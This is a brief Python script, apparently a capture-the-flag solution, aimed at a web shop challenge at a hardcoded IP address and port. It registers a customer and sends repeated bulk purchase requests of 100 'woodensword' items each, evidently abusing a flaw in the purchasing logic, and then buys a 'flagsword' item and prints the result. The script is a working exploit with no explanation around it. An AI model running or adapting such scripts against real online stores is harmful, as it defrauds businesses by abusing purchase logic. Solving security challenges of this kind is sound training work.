import requests

WEB_URL = '167.99.77.149:30600'
r = requests.get(f'http://{WEB_URL}/customer/new')
CUSTOMER_ID = r.json()['id']
print(CUSTOMER_ID)
for i in range(14):
    requests.get(f'http://{WEB_URL}/buy', params={'customer_id': f'{CUSTOMER_ID}', 'items': ['woodensword' for i in range(100)]})
r = requests.get(f'http://{WEB_URL}/buy', params={'customer_id': f'{CUSTOMER_ID}', 'items': ['flagsword']})
print(r.json()['purchased'])
